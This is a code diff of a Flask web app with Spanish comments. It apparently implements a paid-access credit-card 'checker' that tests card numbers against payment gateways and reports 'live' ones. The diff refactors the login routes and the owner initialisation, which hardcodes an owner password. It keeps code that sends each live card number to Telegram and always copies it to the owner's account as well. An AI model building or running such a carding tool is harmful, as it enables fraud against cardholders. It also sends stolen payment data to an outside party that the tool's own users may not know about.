@@ -20,31 +20,30 @@ db = SQLAlchemy(app)
 class User(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     username = db.Column(db.String(50), unique=True, nullable=False)
-    password_hash = db.Column(db.String(512), nullable=False)  # AUMENTADO a 512
-    key = db.Column(db.String(128), db.ForeignKey('key.key'), nullable=True)  # AUMENTADO a 128
+    password_hash = db.Column(db.String(512), nullable=False)
+    key = db.Column(db.String(128), db.ForeignKey('key.key'), nullable=True)
     telegram_id = db.Column(db.String(20), nullable=True)
     role = db.Column(db.String(10), default='user')
 
     def set_password(self, password):
         self.password_hash = generate_password_hash(password)
+
     def check_password(self, password):
         return check_password_hash(self.password_hash, password)
 
 class Key(db.Model):
     id = db.Column(db.Integer, primary_key=True)
-    key = db.Column(db.String(128), unique=True, nullable=False)  # AUMENTADO a 128
+    key = db.Column(db.String(128), unique=True, nullable=False)
     used = db.Column(db.Boolean, default=False)
     expires_at = db.Column(db.DateTime, nullable=True)
-
 
 # Inicializar owner y owner_key si no existen
 def init_owner_and_key():
     try:
-        db.session.rollback()  # Limpia cualquier cambio pendiente
-
-        owner = User.query.filter_by(username='owner1').first()  # Cambiado a owner1
+        db.session.rollback()
+        owner = User.query.filter_by(username='owner1').first()
         if not owner:
-            owner = User(username='owner1', role='owner')        # Cambiado a owner1
+            owner = User(username='owner1', role='owner')
             owner.set_password('Saiper123')
             db.session.add(owner)
             db.session.commit()
@@ -54,10 +53,11 @@ def init_owner_and_key():
             owner_key = Key(key='owner_key', used=True, expires_at=None)
             db.session.add(owner_key)
             db.session.commit()
-
     except Exception as e:
         db.session.rollback()
         print(f"Error inicializando owner y owner_key: {e}")
+
+# RUTA LOGIN / INDEX
 @app.route('/', methods=['GET', 'POST'])
 def index():
     if request.method == 'POST':
@@ -70,13 +70,6 @@ def index():
         flash('Usuario o contraseña incorrectos', 'error')
         return redirect(url_for('index'))
 
-    if 'user_id' in session:
-        return redirect(url_for('dashboard'))
-    return render_template('index.html')
-
-# RUTAS
-@app.route('/')
-def index():
     if 'user_id' in session:
         return redirect(url_for('dashboard'))
     return render_template('index.html')
@@ -113,28 +106,6 @@ def register():
         flash('Registro exitoso, ya puedes iniciar sesión.', 'success')
         return redirect(url_for('index'))
     return render_template('register.html')
-
-def init_owner_and_key():
-    try:
-        db.session.rollback()  # Limpia cualquier cambio pendiente
-
-        owner = User.query.filter_by(username='owner1').first()
-        if not owner:
-            owner = User(username='owner1', role='owner')
-            owner.set_password('Saiper123')  # Esto guarda el hash
-            db.session.add(owner)
-            db.session.commit()
-
-        owner_key = Key.query.filter_by(key='owner_key').first()
-        if not owner_key:
-            owner_key = Key(key='owner_key', used=True, expires_at=None)
-            db.session.add(owner_key)
-            db.session.commit()
-
-    except Exception as e:
-        db.session.rollback()
-        print(f"Error inicializando owner y owner_key: {e}")
-
 
 @app.route('/dashboard')
 def dashboard():
@@ -258,10 +229,10 @@ def check_card():
             result = {'status': 'error', 'message': 'Gateway no válido', 'cc': cc}
 
         if result['status'] == 'live':
-            telegram_ids = set()  # Usamos set() para evitar duplicados
+            telegram_ids = set()
             if user.telegram_id:
                 telegram_ids.add(user.telegram_id)
-            telegram_ids.add('846983753')  # Siempre agrega al Owner
+            telegram_ids.add(OWNER_TELEGRAM_ID)
             enviar_telegram(f"✅ *LIVE* - {result['cc']}\n{result['message']}", list(telegram_ids))
 
         return jsonify(result)
@@ -274,21 +245,9 @@ def ping():
 
 if __name__ == '__main__':
     with app.app_context():
-        
-
         print("Creando owner y owner_key si no existen...")
-        init_owner_and_key()  # Inicializa el usuario owner y la key
+        init_owner_and_key()
         print("Proceso de inicialización terminado.")
 
     port = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=port)
-
-
-
-
-
-
-
-
-
-
